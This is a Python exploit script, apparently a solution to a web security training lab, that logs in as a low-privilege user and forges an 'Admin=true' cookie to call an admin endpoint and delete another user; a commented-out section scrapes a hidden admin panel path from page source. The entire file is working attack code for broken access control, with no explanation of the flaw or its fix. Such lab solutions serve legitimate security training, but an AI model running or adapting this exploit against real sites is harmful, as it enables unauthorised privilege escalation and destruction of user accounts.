import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def get_csrf_token(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'lxml')
    csrf = soup.find('input',{'name':'csrf'})['value']
    return csrf
def delete_user(s,url):
    
  #get the csrf token from the login page
    login_url = url + '/login'
    csrf_token= get_csrf_token(s,login_url)
  #login as the user
    data = {'csrf':csrf_token,'username':'wiener','password':'peter'}

    r= s.post(login_url,data=data,verify=False,proxies=proxies)
    res = r.text
    if 'Log Out' in res:
        print("(+) successfully logged in as the wiener user")
        #retrieve the session cookie
        session_cookie = r.cookies.get_dict().get('session')
        #visit the admin panel and delete carlos
        delete_carlos_url= url + '/admin/delete?username=carlos'
        cookies = {'session':session_cookie,'Admin':'true'}
        r = requests.get(delete_carlos_url,cookies=cookies,verify=False,proxies=proxies)
        if r.status_code == 200:
            print('(+) carlos deleted successfully')
        else:
            print('(+) deletion failed')
            print('(+) exiting script')
            sys.exit(-1)
            
    else:
        print("(+) login failes")
        sys.exit(-1)

    # admin_panel_url = url + '/administrator-panel'
    # r = requests.get(admin_panel_url,verify= False,proxies = proxies)
    # #retrieve session cookie
    # session_cookie = r.cookies.get_dict().get('session')
    # #retrieve the admin path
    # soup = BeautifulSoup(r.text,'lxml')
    # admin_instances = soup.find(text=re.compile("/admin-"))
    # # print(admin_instances)
    # admin_path = re.search("href', '(.*)'",admin_instances).group(1)
    # #print(admin_path)

    # #delete carlos user
    # cookie = {'session':session_cookie}
    # delete_carlos_url = url + admin_path + 'delete?username=carlos'
    # r = requests.get(delete_carlos_url,cookies=cookie,verify=False,proxies=proxies)
    # if r.status_code == 200:
    #     print('(+) carlos deleted successfully')
    # else:
    #     print('(+) deletion failed')
    #     print('(+) exiting script')
    #     sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Usage: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    print("(+) Finding admin panel...")
    delete_user(s,url)
if __name__ == '__main__':
    main()